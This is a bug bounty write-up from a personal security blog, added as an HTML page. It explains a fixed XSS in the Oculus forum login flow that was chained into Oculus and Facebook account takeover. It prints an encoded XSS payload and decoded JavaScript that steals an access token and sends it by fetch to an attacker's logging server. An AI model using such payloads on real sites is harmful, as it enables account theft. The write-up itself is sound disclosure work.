@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>XSS on forums.oculusvr.com leads to Oculus and Facebook account takeovers | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="XSS on forums.oculusvr.com leads to Oculus and Facebook account takeovers" />
+<meta name="author" content="qw" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This bug could allow an attacker to steal a first party Oculus access token which would allow him to access the victim account. This is achieved by exploiting a cross-site scripting bug in forums.oculusvr.com." />
+<meta property="og:description" content="This bug could allow an attacker to steal a first party Oculus access token which would allow him to access the victim account. This is achieved by exploiting a cross-site scripting bug in forums.oculusvr.com." />
+<link rel="canonical" href="http://localhost:4000/2021/01/01/xss-on-forums-oculusvr-com-leads-to-oculus-and-facebook-account-takeovers.html" />
+<meta property="og:url" content="http://localhost:4000/2021/01/01/xss-on-forums-oculusvr-com-leads-to-oculus-and-facebook-account-takeovers.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-01-01T15:54:41+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="XSS on forums.oculusvr.com leads to Oculus and Facebook account takeovers" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"qw"},"dateModified":"2021-01-01T15:54:41+01:00","datePublished":"2021-01-01T15:54:41+01:00","description":"This bug could allow an attacker to steal a first party Oculus access token which would allow him to access the victim account. This is achieved by exploiting a cross-site scripting bug in forums.oculusvr.com.","headline":"XSS on forums.oculusvr.com leads to Oculus and Facebook account takeovers","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/01/01/xss-on-forums-oculusvr-com-leads-to-oculus-and-facebook-account-takeovers.html"},"url":"http://localhost:4000/2021/01/01/xss-on-forums-oculusvr-com-leads-to-oculus-and-facebook-account-takeovers.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">XSS on forums.oculusvr.com leads to Oculus and Facebook account takeovers</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-01-01T15:54:41+01:00" itemprop="datePublished">Jan 1, 2021
+      </time>• <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-author h-card" itemprop="name">qw</span></span></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This bug could allow an attacker to steal a first party Oculus access token which would allow him to access the victim account. This is achieved by exploiting a cross-site scripting bug in forums.oculusvr.com.</p>
+
+<p><strong>Technical Details</strong></p>
+
+<p>This was possible because <strong>forums.oculusvr.com</strong> domain uses <strong>oculus.com</strong> authentication mechanism to login users to the forum using <strong>https://graph.oculus.com/authenticate_web_application/</strong> endpoint which would redirect him to <strong>https://forums.oculusvr.com/entry/oculus</strong> with an oculus access_token that could access <strong>graph.oculus.com/graphql</strong> and make GraphQL mutations/queries that allow him to takeover the account.</p>
+
+<p>The forums.oculus.com domain is out of scope in the Facebook program according to the program <a href="https://www.facebook.com/whitehat/">policy page</a> since it hosts a third party web application (Vanilla Forums). However, this bug was found in the authentication flow added by Facebook to the forum to allow Oculus users to access it without the need to create a new account in the forum.</p>
+
+<p>The code served in <strong><a href="https://forums.oculusvr.com/entry/oculus">https://forums.oculusvr.com/entry/oculus</a></strong> had debug mode enabled and if we check the script embedded <strong><a href="https://forums.oculusvr.com/plugins/oculus/js/oculus-oauth.js?fbclid=IwAR1n1it_ukn7ckI0LdKXSs2tk0T3brVFgQjpHl65vchBfwrhVDbOYsM2MZ4">https://forums.oculusvr.com/plugins/oculus/js/oculus-oauth.js</a></strong>, we’d notice that if the debug mode is enabled, it would unsafely use document.write to add the content of the state parameter inside the fragment part of the URL (#state=PAYLOAD) to the document.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">oculusConnect</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span> <span class="p">{</span>
+     <span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">params</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">undefined</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
+         <span class="k">return</span><span class="p">;</span>
+     <span class="p">}</span>
+ <span class="s2">`if (typeof params.connect === "undefined") {`</span>
+<span class="s2">`return;`</span>
+<span class="s2">` } `</span>
+<span class="s2">`var response = decodeURIComponent(document.location.hash);`</span>
+<span class="s2">`var hash = response.substring(response.indexOf("#") + 1, response.indexOf("&amp;")); `</span>
+<span class="s2">`var queryString = response.replace("#" + hash, ""); `</span>
+<span class="s2">`var queryStringSplit = queryString.split("&amp;"); `</span>
+<span class="s2">`var state = getParam(queryStringSplit, "state"); `</span>
+<span class="s2">`var savedState = params.connect.savedState; `</span>
+<span class="s2">`var hashSplit = hash.split("="); `</span>
+<span class="s2">`var hashKey = hashSplit[0]; `</span>
+<span class="s2">`var hashValue = hashSplit[1]; `</span>
+<span class="s2">`var loginType = this.frameElement.id; `</span>
+
+<span class="s2">`if (params.connect.debug) {     `</span>
+<span class="s2">`document.write("login type : " + loginType + `</span>
+<span class="s2">`";&lt;br &gt;document location:" + document.location + `</span>
+<span class="s2">`";&lt;br &gt;Saved State:" + savedState + `</span>
+<span class="s2">`";&lt;br &gt;State:" + state + `</span>
+<span class="s2">`";&lt;br &gt;Hash Key:" +  hashKey); `</span>
+<span class="s2">`}`</span>
+<span class="p">...</span>
+</code></pre></div></div>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">document</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">DOMContentLoaded</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="dl">"</span><span class="s2">connect</span><span class="dl">"</span><span class="p">:</span>
+                <span class="p">{</span>
+                    <span class="dl">"</span><span class="s2">debug</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span> <span class="p">,</span>
+                    <span class="dl">"</span><span class="s2">savedState</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">G1H7LE7UOJ</span><span class="dl">"</span> <span class="p">,</span>
+                    <span class="dl">"</span><span class="s2">authorizeUrl</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://graph.oculus.com/authenticate_web_application</span><span class="dl">"</span> <span class="p">,</span>
+                    <span class="dl">"</span><span class="s2">oculusHash</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">X</span><span class="dl">"</span> <span class="p">,</span>
+                    <span class="dl">"</span><span class="s2">associationKey</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">OC|1238816349468370|</span><span class="dl">"</span> <span class="p">,</span>
+                    <span class="dl">"</span><span class="s2">webAddress</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://forums.oculusvr.com</span><span class="dl">"</span>
+                <span class="p">}</span>
+        <span class="p">}</span>
+<span class="nf">oculusConnect</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Notice that we used the “state” to serve our payload although document.location is passed too to document.write, this is intended since document.location would have the URL encoded format of the payload however “state” would have a decoded format since it was extracted “response” which used decodeURIComponent method to decode the hash fragment.</p>
+
+<p>To this point, this seems like an easy XSS however if one read the code carefully you’ll notice that <code class="language-plaintext highlighter-rouge">&lt;strong&gt;var loginType = this.frameElement.id;&lt;/strong&gt;</code> was added before the usage of the document.write. This is bad since this line of code would return an error “<strong>TypeError: Cannot read property ‘id’ of null</strong>” which is obvious since frameElement would exist only if the current page is iframed and the parent window is same-origin. <br />
+To solve this problem, we should find a way to iframe the page <a href="https://forums.oculusvr.com/entry/oculus#state=payload"><strong>https://forums.oculusvr.com/entry/oculus</strong>#state=payload</a> inside forums.oculusvr.com and send the final link with the iframe to the targeted user.</p>
+
+<p><strong>Embeds in Vanilla Forums</strong></p>
+
+<p>Vanilla forums allows embeds from a list of whitelisted websites as shows the code snippet from one of the files in the source code (Legacy function however the new embedding methods had basically the same code and checks) :</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">unembedContent</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$content</span><span class="p">):</span> <span class="kt">string</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">embedConfig</span><span class="o">-&gt;</span><span class="nf">isYoutubeEnabled</span><span class="p">())</span> <span class="p">{</span>
+            <span class="nv">$content</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
+                <span class="s1">'`&lt;iframe.*src="https?://.*youtube\.com/embed/([a-z0-9_-]*)".*&lt;/iframe&gt;`i'</span><span class="p">,</span>
+                <span class="s2">"</span><span class="se">\n</span><span class="s2">https://www.youtube.com/watch?v=$1</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span>
+                <span class="nv">$content</span>
+            <span class="p">);</span>
+            <span class="nv">$content</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
+                <span class="s1">'`&lt;object.*value="https?://.*youtube\.com/v/([a-z0-9_-]*)[^"]*".*&lt;/object&gt;`i'</span><span class="p">,</span>
+                <span class="s2">"</span><span class="se">\n</span><span class="s2">https://www.youtube.com/watch?v=$1</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span>
+                <span class="nv">$content</span>
+            <span class="p">);</span>
+
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">embedConfig</span><span class="o">-&gt;</span><span class="nf">isVimeoEnabled</span><span class="p">())</span> <span class="p">{</span>
+            <span class="nv">$content</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
+                <span class="s1">'`&lt;iframe.*src="((https?)://.*vimeo\.com/video/([0-9]*))".*&lt;/iframe&gt;`i'</span><span class="p">,</span>
+                <span class="s2">"</span><span class="se">\n</span><span class="s2">$2://vimeo.com/$3</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span>
+                <span class="nv">$content</span>
+            <span class="p">);</span>
+            <span class="nv">$content</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
+                <span class="s1">'`&lt;object.*value="((https?)://.*vimeo\.com.*clip_id=([0-9]*)[^"]*)".*&lt;/object&gt;`i'</span><span class="p">,</span>
+                <span class="s2">"</span><span class="se">\n</span><span class="s2">$2://vimeo.com/$3</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span>
+                <span class="nv">$content</span>
+            <span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">embedConfig</span><span class="o">-&gt;</span><span class="nf">isGettyEnabled</span><span class="p">())</span> <span class="p">{</span>
+            <span class="nv">$content</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
+                <span class="s1">'`&lt;iframe.*src="(https?:)?//embed\.gettyimages\.com/embed/([\w=?&amp;+-]*)" width="([\d]*)" height="([\d]*)".*&lt;/iframe&gt;`i'</span><span class="p">,</span>
+                <span class="s2">"</span><span class="se">\n</span><span class="s2">http://embed.gettyimages.com/$2/$3/$4</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span>
+                <span class="nv">$content</span>
+            <span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="n">getEmbedRegexes</span><span class="p">():</span> <span class="kt">array</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="p">[</span>
+            <span class="s1">'YouTube'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                    <span class="c1">// Warning: Very long regex.</span>
+                    <span class="s1">'/https?:\/\/(?:(?:www.)|(?:m.))?(?:(?:youtube.com)|(?:youtu.be))\/(?:(?:playlist?)'</span>
+                    <span class="mf">.</span> <span class="s1">'|(?:(?:watch\?v=)?(?P&lt;videoId&gt;[\w-]{11})))(?:\?|\&amp;)?'</span>
+                    <span class="mf">.</span> <span class="s1">'(?:list=(?P&lt;listId&gt;[\w-]*))?(?:t=(?:(?P&lt;minutes&gt;\d*)m)?(?P&lt;seconds&gt;\d*)s)?(?:#t=(?P&lt;start&gt;\d*))?/i'</span>
+                <span class="p">],</span>
+            <span class="p">],</span>
+
+            <span class="s1">'Twitter'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'/https?:\/\/(?:www\.)?twitter\.com\/(?:#!\/)?(?:[^\/]+)\/status(?:es)?\/([\d]+)/i'</span><span class="p">],</span>
+            <span class="p">],</span>
+            <span class="s1">'Vimeo'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'/https?:\/\/(?:www\.)?vimeo\.com\/(?:channels\/[a-z0-9]+\/)?(\d+)/i'</span><span class="p">],</span>
+            <span class="p">],</span>
+            <span class="s1">'Vine'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'/https?:\/\/(?:www\.)?vine\.co\/(?:v\/)?([\w]+)/i'</span><span class="p">],</span>
+            <span class="p">],</span>
+            <span class="s1">'Instagram'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'/https?:\/\/(?:www\.)?instagr(?:\.am|am\.com)\/p\/([\w-]+)/i'</span><span class="p">],</span>
+            <span class="p">],</span>
+            <span class="s1">'Pinterest'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                    <span class="s1">'/https?:\/\/(?:www\.)?pinterest\.com\/pin\/([\d]+)/i'</span><span class="p">,</span>
+                    <span class="s1">'/https?:\/\/(?:www\.)?pinterest\.ca\/pin\/([\d]+)/i'</span><span class="p">,</span>
+                <span class="p">],</span>
+            <span class="p">],</span>
+            <span class="s1">'Getty'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'/https?:\/\/embed.gettyimages\.com\/([\w=?&amp;;+-_]*)\/([\d]*)\/([\d]*)/i'</span><span class="p">],</span>
+            <span class="p">],</span>
+            <span class="s1">'Twitch'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'/https?:\/\/(?:www\.)?twitch\.tv\/([\w]+)$/i'</span><span class="p">],</span>
+            <span class="p">],</span>
+            <span class="s1">'TwitchRecorded'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'/https?:\/\/(?:www\.)?twitch\.tv\/videos\/(\w+)$/i'</span><span class="p">],</span>
+            <span class="p">],</span>
+            <span class="s1">'Soundcloud'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'/https?:(?:www\.)?\/\/soundcloud\.com\/([\w=?&amp;;+-_]*)\/([\w=?&amp;;+-_]*)/i'</span><span class="p">],</span>
+            <span class="p">],</span>
+            <span class="s1">'Gifv'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'/https?:\/\/i\.imgur\.com\/([a-z0-9]+)\.gifv/i'</span><span class="p">],</span>
+            <span class="p">],</span>
+            <span class="s1">'Wistia'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                <span class="s1">'regex'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+                    <span class="c1">// Format1</span>
+                    <span class="s1">'/https?:\/\/(?:[A-za-z0-9\-]+\.)?(?:wistia\.com|wi\.st)\/.*?'</span>
+                    <span class="mf">.</span> <span class="s1">'\?wvideo=(?&lt;videoID&gt;([A-za-z0-9]+))(\?wtime=(?&lt;time&gt;((\d)+m)?((\d)+s)?))?/i'</span><span class="p">,</span>
+                    <span class="c1">// Format2</span>
+
+                    <span class="s1">'/https?:\/\/([A-za-z0-9\-]+\.)?(wistia\.com|wi\.st)\/medias\/(?&lt;videoID&gt;[A-za-z0-9]+)'</span>
+                    <span class="mf">.</span> <span class="s1">'(\?wtime=(?&lt;time&gt;((\d)+m)?((\d)+s)?))?/i'</span><span class="p">,</span>
+                <span class="p">],</span>
+            <span class="p">],</span>
+        <span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>A bug was found in one of these whitelisted websites which allowed me to redirect from the embedded page in Vanilla Forums to the url <strong>https://forums.oculusvr.com/entry/oculus</strong> with the XSS payload. Unfortunately this bug won’t be discussed here :’).</p>
+
+<p><strong>Exploitation</strong></p>
+
+<p>Login with your Oculus account to <strong>forums.oculus.com</strong> , go to “<strong>New Discussion</strong>” and click “<strong>Toggle Html View</strong>“, and add this payload. This was changed of course so you won’t identify where the second bug was found based on previous regular expressions :’)</p>
+
+<pre><code class="language-markup">&lt;iframe src="https://REDACTED/REDACTED" /&gt;
+</code></pre>
+
+<p>and click on “Preview” then “Post Discussion” . This would create a thread which contains an iframe with REDACTED as source. The page in REDACTED would exploit the bug which would redirect us inside the iframe to final URL that would exploit the XSS.</p>
+
+<p>The payload for the XSS that would steal the Oculus user access_token is as follow:</p>
+
+<pre><code class="language-markup">https://forums.oculusvr.com/entry/oculus/#access_token=test&amp;state=&lt;script&gt;
+eval(atob("dmFyIGlmcm0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTtpZnJ
+tLnNldEF0dHJpYnV0ZSgnaWQnLCAndGVzdCcpO2lmcm0uc2V0QXR0cmlidXRlKCdzcmMnLCAna
+HR0cHM6Ly9ncmFwaC5vY3VsdXMuY29tL2F1dGhlbnRpY2F0ZV93ZWJfYXBwbGljYXRpb24/YWN
+jZXNzX3Rva2VuPU9DJTdDMTIzODgxNjM0OTQ2ODM3MCU3QyZyZWRpcmVjdF91cmk9aHR0cHMlM
+0ElMkYlMkZmb3J1bXMub2N1bHVzdnIuY29tJTJGZW50cnklMkZvY3VsdXMmc3RhdGU9VjFIVzl
+TMkxHWiZtZXRob2Q9cG9zdCcpO2lmcm0ub25sb2FkID0gZnVuY3Rpb24oKXthbGVydChkb2N1b
+WVudC5nZXRFbGVtZW50QnlJZCgndGVzdCcpLmNvbnRlbnRXaW5kb3cubG9jYXRpb24uaHJlZil
+9O2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZybSk7"));&lt;/script&gt;
+</code></pre>
+
+<p>The second payload was base64 encoded since it contains some characters (=, &amp; ) that would mess the splitting done in <strong>oculusConnect</strong> to extract the state part. The origin one is :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">ifrm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">ifrm</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">test</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">ifrm</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">src</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">https://graph.oculus.com/authenticate_web_application?access_token=OC|1238816349468370|&amp;redirect_uri=https://forums.oculusvr.com/entry/oculus&amp;state=V1HW9S2LGZ&amp;method=post</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">ifrm</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+       <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">test</span><span class="dl">'</span><span class="p">).</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+       <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://logging-server/log.php?x=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">token</span><span class="p">);</span>
+<span class="p">};</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">ifrm</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>We create another iframe which would request <strong>https://graph.oculus.com/authenticate_web_application</strong>, this would redirect to <strong>https://forums.oculusvr.com/entry/oculus</strong> with a valid access_token. Since the iframe and parent are same-origin, we can access the iframe window and read location.href. We’ll send the access_token to our logging server.</p>
+
+<p><strong>Account takeover of Oculus and Facebook accounts</strong></p>
+
+<p>Tokens generated with the “Oculus Forums” application with id 1238816349468370 had access to <strong>https://graph.oculus.com/graphql</strong> which allows it to make GraphQL mutations/queries. However, account takeover wasn’t possible since changing password, adding contactpoints or changing pin required the knowledge of the user PIN. Also the application didn’t have access to read the linked Facebook account access_token (From <a href="https://www.josipfranjkovic.com/">JOSIP FRANJKOVIĆ</a> blog who discovered this trick and used before) and this query returned <strong>null</strong> :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">https</span><span class="p">:</span><span class="c1">//graph.oculus.com/graphql?access_token=VICTIM_TOKEN&amp;method=post</span>
+<span class="o">&amp;</span><span class="nx">q</span><span class="o">=</span><span class="nf">viewer</span><span class="p">(){</span><span class="nx">linked_accounts_info</span><span class="p">{</span><span class="nx">facebook_account</span><span class="p">{</span><span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">access_token</span><span class="o">&lt;</span><span class="sr">/strong&gt;}}</span><span class="err">}
+</span></code></pre></div></div>
+
+<p>The access_token disclosed seemed useful after all to only read some user information or edit/view user owned applications/organisations. <br />
+Fortunately, i was able to find a third bug (feature?) which allowed me to upgrade the access_token to the context of another application ( WWW 752908224809889 ) and bypass limited permissions of the previous application. This application had the ability to read the linked Facebook access_token which allowed me to first Takeover the Facebook account ( like described in Josip blog post ) or use the Facebook access_token to login to the Oculus account using the endpoint <a href="https://graph.oculus.com/fbauth">https://graph.oculus.com/fbauth</a>.</p>
+
+<p><strong>Disclaimer</strong><br />
+Although this bug was cool to find and exploit which resulted in a critical vulnerability, i always advice to follow the program policy and hunt for bugs in only in-scope domains. Facebook clearly stated that this bug was an exception because ,to my opinion, it was found in the code added by Facebook and not the third-party web application code.</p>
+
+<p><strong>Timeline</strong></p>
+
+<p>Nov 24, 2020— Report Sent <br />
+Nov 24, 2020— Acknowledged by Facebook<br />
+Dec 1, 2020— Fixed by Facebook<br />
+Dec 17, 2020 — $30K (including bonus) bounty awarded by Facebook.</p>
+
+  </div><a class="u-url" href="/2021/01/01/xss-on-forums-oculusvr-com-leads-to-oculus-and-facebook-account-takeovers.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
